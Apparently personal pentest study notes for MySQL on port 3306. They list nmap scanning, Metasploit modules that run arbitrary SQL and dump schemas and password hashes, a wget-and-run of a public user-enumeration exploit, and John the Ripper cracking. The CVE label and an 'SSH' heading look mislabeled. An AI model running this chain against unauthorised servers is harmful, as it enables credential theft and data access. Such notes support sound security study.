# MySQL / Port 3306
MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)

## Workflow
Provided that necessary credentials such as username and password is already found, or anonymous login is allowed.

1. Port scan with nmap
2. Enumerate useful information with several tools
3. Crack the password hash of a user
4. Access MySQL server with credentials


## Advance preparation
```
export rhost=[RHOST IP]
```

## Port scan
Check if port 3306 is open
```
sudo nmap -sS -sV -O $rhost
```

## Enumeration
### Metasploit (*1)
Execute arbitrary commands on the MySQL server
```
use auxiliary/admin/mysql/mysql_sql
```

### Nmap ([MySQL-Enum](https://nmap.org/nsedoc/scripts/mysql-enum.html)) (*2)
```
sudo nmap $rhost -vv --script=mysql-enum
```

### CVE : [2015-5615](https://www.exploit-db.com/exploits/23081) (*3)
```
wget https://www.exploit-db.com/raw/23081 -O /tmp/mysqlenum.pl
cd /tmp && perl mysqlenum.pl $rhost usernames.txt
```

To install Parallel::ForkManager:
```
sudo cpan Parallel::ForkManager
```

## Exploitation
### Metasploit
Dump the tables, and column names of the whole database (*1)
```
use auxiliary/scanner/mysql/mysql_schemadump
```

Obtain users' password hashes on the MySQL server (*1)
```
use auxiliary/scanner/mysql/mysql_hashdump
```

### Crack password hash
```
echo 'carl:*xxxxxxxxxxxxxxxxxxxxxxxxxxxxx' | tee hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Access MySQL server with SSH
```
mysql -h $rhost -u [USERNAME] -p
```

To install MySQL client:
```
sudo apt install default-mysql-client
```

## Memo
*1 ユーザー名、パスワードがあらかじめわかっており、特定のユーザーでログインできる状態でないと失敗する。

*2 使い方は簡単だが、結果は信頼性に欠けるので注意。実行結果にリストアップされたアカウントはいずれもパスワードなしでログイン可能と表示されるが、実際にはそれだとアクセス拒否された。  

![スクリーンショット 2021-10-26 22 12 18](https://user-images.githubusercontent.com/39334151/138886104-c714cdc3-d6ec-49b8-bbf4-1d9bf556ca0e.png)  

*3 使い方は簡単だが、結果は信頼性に欠けるので注意。ダミーのユーザー名にもかかわらず、ユーザーが存在する旨の結果を返すことも多々ある。  

![スクリーンショット 2021-10-26 22 11 52](https://user-images.githubusercontent.com/39334151/138886012-c1fc9882-c9c4-43f7-8a55-c7d9fd4e0fa9.png)  

